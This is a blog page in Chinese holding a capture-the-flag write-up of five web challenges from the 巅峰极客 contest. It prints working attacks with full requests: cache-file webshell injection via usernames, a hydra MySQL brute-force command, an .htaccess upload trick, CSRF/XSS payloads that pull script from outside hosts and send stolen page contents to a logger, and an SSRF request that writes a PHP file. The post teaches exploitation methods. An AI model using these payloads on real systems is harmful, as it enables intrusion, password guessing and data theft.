<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="当天车上看了一会题,然后回来继续肝了一会,太累了睡着了...比较惨...今天就简单复现一下吧 A Simple CMS 进去之后发现是oneThink的框架  百度一下漏洞,发现有个缓存洞,然后我就直接访问了那个缓存文件,发现不存在...然后就没看了..看了wp发现就是缓存做的不过缓存改了,然后给了个www.zip让我们看文件..可还行.. 思路就是以此注册两个账号 %0a$a&#x3D;$_GET[a];">
<meta property="og:type" content="article">
<meta property="og:title" content="巅峰极客webwriteup">
<meta property="og:url" content="http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/index.html">
<meta property="og:site_name" content="blacsheep&#39;s blog">
<meta property="og:description" content="当天车上看了一会题,然后回来继续肝了一会,太累了睡着了...比较惨...今天就简单复现一下吧 A Simple CMS 进去之后发现是oneThink的框架  百度一下漏洞,发现有个缓存洞,然后我就直接访问了那个缓存文件,发现不存在...然后就没看了..看了wp发现就是缓存做的不过缓存改了,然后给了个www.zip让我们看文件..可还行.. 思路就是以此注册两个账号 %0a$a&#x3D;$_GET[a];">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/2018/07/geek-1.jpg">
<meta property="og:image" content="http://example.com/images/2018/07/geek-2.jpg">
<meta property="og:image" content="http://example.com/images/2018/07/geek-3.png">
<meta property="og:image" content="http://example.com/images/2018/07/geek-3.jpg">
<meta property="og:image" content="http://example.com/images/2018/07/geek-4.jpg">
<meta property="og:image" content="http://example.com/images/2018/07/geek-5.jpg">
<meta property="og:image" content="http://example.com/images/2018/07/geek-6.jpg">
<meta property="og:image" content="http://example.com/images/2018/07/geek-7.jpg">
<meta property="og:image" content="http://example.com/images/2018/07/geek-9.jpg">
<meta property="og:image" content="http://example.com/images/2018/07/geek-8.jpg">
<meta property="og:image" content="http://example.com/images/2018/07/geek-9-1.jpg">
<meta property="og:image" content="http://example.com/images/2018/07/geek-10.jpg">
<meta property="article:published_time" content="2018-07-23T10:33:53.000Z">
<meta property="article:modified_time" content="2023-07-10T02:13:29.464Z">
<meta property="article:author" content="blacsheep">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/2018/07/geek-1.jpg">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>巅峰极客webwriteup</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2018/07/24/%E8%AE%A1%E7%BB%84%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2018/07/22/dz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&text=巅峰极客webwriteup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&title=巅峰极客webwriteup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&is_video=false&description=巅峰极客webwriteup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=巅峰极客webwriteup&body=Check out this article: http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&title=巅峰极客webwriteup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&title=巅峰极客webwriteup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&title=巅峰极客webwriteup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&title=巅峰极客webwriteup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&name=巅峰极客webwriteup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&t=巅峰极客webwriteup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#a-simple-cms"><span class="toc-number">1.</span> <span class="toc-text">A Simple CMS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyweb"><span class="toc-number">2.</span> <span class="toc-text">babyweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pentest"><span class="toc-number">3.</span> <span class="toc-text">pentest</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-online"><span class="toc-number">4.</span> <span class="toc-text">Mysql Online</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dedefun"><span class="toc-number">5.</span> <span class="toc-text">dedefun</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        巅峰极客webwriteup
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">blacsheep</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2018-07-23T10:33:53.000Z" class="dt-published" itemprop="datePublished">2018-07-23</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/web%E7%AF%87/">web篇</a>
    </div>


      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>当天车上看了一会题,然后回来继续肝了一会,太累了睡着了...比较惨...今天就简单复现一下吧</p>
<h3 id="a-simple-cms">A Simple CMS</h3>
<p>进去之后发现是oneThink的框架 <img src="/images/2018/07/geek-1.jpg" alt="blacsheep" /> 百度一下漏洞,发现有个缓存洞,然后我就直接访问了那个缓存文件,发现不存在...然后就没看了..看了wp发现就是缓存做的不过缓存改了,然后给了个www.zip让我们看文件..可还行.. 思路就是以此注册两个账号 <code>%0a$a=$_GET[a];//</code>和<code>%0aecho `$a `;//</code> 然后再依次登录,然后缓存文件就有shell了,本地实验一下,然后发现文件在<code>Runtime/Temp/onethink_d403acece4ebce56a3a4237340fbbe70.php</code> 然后就getshell了 burp的包</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?s=/Home/User/register.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>b87051f333804bcda22717be7b65a925c2190c99315c4e0e.game.ichunqiu.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>95</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://b87051f333804bcda22717be7b65a925c2190c99315c4e0e.game.ichunqiu.com</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://b87051f333804bcda22717be7b65a925c2190c99315c4e0e.game.ichunqiu.com/index.php?s=/Home/User/register.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=163bce1a13fc08-098d67d4284b6b-737356c-1fa400-163bce1a140248; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; pgv_pvi=3919248384; pgv_si=s6303365120; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1532146491,1532218918,1532239817; ci_session=e130184c93df8e71c7b9b914a9a57533887d6aeb; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1532267215; PHPSESSID=5umnh4fksrbf55vrvd9aokaik0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">username</span>=%<span class="number">0</span>aecho `$a`;//&amp;password=<span class="number">123321</span>&amp;repassword=<span class="number">123321</span>&amp;email=<span class="number">12344121</span>%<span class="number">40</span>qq.com&amp;verify=elbpi</span></span><br></pre></td></tr></table></figure>
<p>flag在tmp下 <img src="/images/2018/07/geek-2.jpg" alt="blacsheep" /></p>
<h3 id="babyweb">babyweb</h3>
<p>hydra爆出mysql的root密码,虽然现在已经爆不了了..</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -p 1q2w3e4r5t6y 117.50.1.145 mysql</span><br></pre></td></tr></table></figure>
<p>当然里面的-p可以换成-P然后跟字典文件,这个弱密码在某top3575弱密码里面有,是可以爆出来的... 然后从库里面发现账号密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:BabyWeb@my.lol</span><br><span class="line">password:babyweb@1990</span><br></pre></td></tr></table></figure>
<p>差一点点就猜出来了..我当时试的账号是BabyWeb@my.lol,密码试的是babyweb&amp;1990,有点可惜... 进去之后发现了一个文件上传的点,上传的名字不知道,这里需要连数据库然后这里说只有.htaccess可以传,那就传.htaccess</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;abc&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<p>然后传个abc结尾的文件就getshell了 不过需要连接数据库...现在已经连不上了,就不演示了 非常规解是读了/etc/shadow,然后用john解出ssh密码然后连上去拿flag的... <img src="/images/2018/07/geek-3.png" alt="blacsheep" /> 大佬大佬orz...</p>
<h3 id="pentest">pentest</h3>
<p>这个题...好吧感觉蛮坑的,扫目录得到/file/file.php,发现是个任意文件删除,删除掉config里面的install.lock然后就可以重装,重装的时候数据库配置插入一句话木马,可以本地先试试,然后再去打服务器,然后就shell了... <img src="/images/2018/07/geek-3.jpg" alt="blacsheep" /> 然后/tmp下找到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6d791d58-5b04-4406-ad07-78a3dcac6802&#125;</span><br></pre></td></tr></table></figure>
<h3 id="mysql-online">Mysql Online</h3>
<p>这个题的xss思路蛮好的,虽然题目是个mysql而且我思路一开始直接就错了... 利用sql读的数据可以造成xss <img src="/images/2018/07/geek-4.jpg" alt="blacsheep" /> 当然你也可以unhex一下,一样的 在提交的content里面填自己的vps,然后得到返回 <img src="/images/2018/07/geek-5.jpg" alt="blacsheep" /> 可以看到登录页面,那么下面就是通过csrf来让他打到自己的页面咯,vps上构造页面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/runsql.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;sql&quot; value=&quot;select 0x3c736372697074207372633d68747470733a2f2f78737370742e636f6d2f32724f7a6c773f313533323333333438363e3c2f7363726970743e&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>简单的一个页面,让服务端向127.0.0.1的runsql.php发请求,服务端请求之后导致xss的payload生效...第一次打csrf,学习了学习了... 服务端访问之后,信息打到xsspt上,看一下结果 <img src="/images/2018/07/geek-6.jpg" alt="blacsheep" /> 发现cookie没东西,那我们去打一下admin_zzzz666.php的页面,得到结果 <img src="/images/2018/07/geek-7.jpg" alt="blacsheep" /> base解一下,得到页面内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">403: only 127.0.0.1 can find me, so you can get this: http://127.0.0.1/runsql.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Online Mysql Run&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h3&gt;Admin Index:&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;./static/img/iamsecret_555.jpg&quot;&gt;</span><br><span class="line"></span><br><span class="line">I am l3m0n tree.</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>发现有个图片,直接访问,发现403了,那么去获取这个图片咯,github上面有个可以canvas画页面的工具,给个链接 <a target="_blank" rel="noopener" href="https://github.com/Lz1y/frame2canvas" title="https://github.com/Lz1y/frame2canvas">https://github.com/Lz1y/frame2canvas</a> 然后修改一下配置 <img src="/images/2018/07/geek-9.jpg" alt="blacsheep" /> 然后payload,payload注意hex一下然后传到sql变量里面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe id=&quot;myIframe&quot; src=&quot;admin_zzzz666.php&quot;&gt;&lt;/iframe&gt;&lt;script src=&quot;//attack.com/atk.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>然后写一个receive.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Origin: *&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;log.txt&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;v&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>然后就可以收到log.txt了,然后base转图片就可以看到flag了 <img src="/images/2018/07/geek-8.jpg" alt="blacsheep" /></p>
<h3 id="dedefun">dedefun</h3>
<p>这个题其实还是远古的getimagesize暴路径那个点,不过有更新,就是getimagesize可以造成ssrf,比如说我在我的kali上配一个简单页面 <img src="/images/2018/07/geek-9-1.jpg" alt="blacsheep" /> 访问之后,发现在vps上收到显示 <img src="/images/2018/07/geek-10.jpg" alt="blacsheep" /> 然后就没有了,因为这道题就是个ssrf的点... 题目描述</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">运维自己的网站，我还是喜欢用shell的方式，这样肯定没人能日进来了。</span><br><span class="line">1.php</span><br><span class="line">&lt;?php</span><br><span class="line">if ($_SERVER[&#x27;REMOTE_ADDR&#x27;] !== &#x27;127.0.0.1&#x27;) &#123;</span><br><span class="line">    die(&#x27;Who are you? your ip is:&#x27;.$_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>那么直接</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/tags.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>love.lemon</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,ja;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>YDAL_2132_saltkey=umJCWaoK; YDAL_2132_lastvisit=1531231707; YDAL_2132_ulastactivity=8d9ffh%2BiVUvLiWxFVmAltTKPHq5V9hUJ5PvDa4s84r553KMhDZMx; YDAL_2132_auth=a017j1pf9qMN%2F5Pa1g7C6kyv3ik6f%2B7eqtppI5c6sSWzI0ggQU5wSkRNDoXuXqvSSMnI%2BN3ObxEMn7jaaNJW; YDAL_2132_nofavfid=1; YDAL_2132_lip=10.211.55.2%2C1531237092; YDAL_2132_home_diymode=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>251</span><br><span class="line"></span><br><span class="line"><span class="language-asciidoc">dopost=save&amp;_FILES[lsa][tmp_name]=<span class="link">http://127.0.0.1/1.php?a=assert%26b=file_put_contents($_GET</span>[<span class="string">1</span>],base64_decode($_GET[2]));%261=./uploads/soft/aaaa.php%262=PD9waHAgcGhwaW5mbygpOyA/Pg==&amp;_FILES[lsa][name]=0&amp;_FILES[lsa][size]=0&amp;_FILES[lsa][type]=image/gif</span></span><br></pre></td></tr></table></figure>
<p>就ok了,没啥好说的</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#a-simple-cms"><span class="toc-number">1.</span> <span class="toc-text">A Simple CMS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyweb"><span class="toc-number">2.</span> <span class="toc-text">babyweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pentest"><span class="toc-number">3.</span> <span class="toc-text">pentest</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-online"><span class="toc-number">4.</span> <span class="toc-text">Mysql Online</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dedefun"><span class="toc-number">5.</span> <span class="toc-text">dedefun</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&text=巅峰极客webwriteup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&title=巅峰极客webwriteup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&is_video=false&description=巅峰极客webwriteup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=巅峰极客webwriteup&body=Check out this article: http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&title=巅峰极客webwriteup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&title=巅峰极客webwriteup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&title=巅峰极客webwriteup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&title=巅峰极客webwriteup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&name=巅峰极客webwriteup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/&t=巅峰极客webwriteup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2023
    blacsheep
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
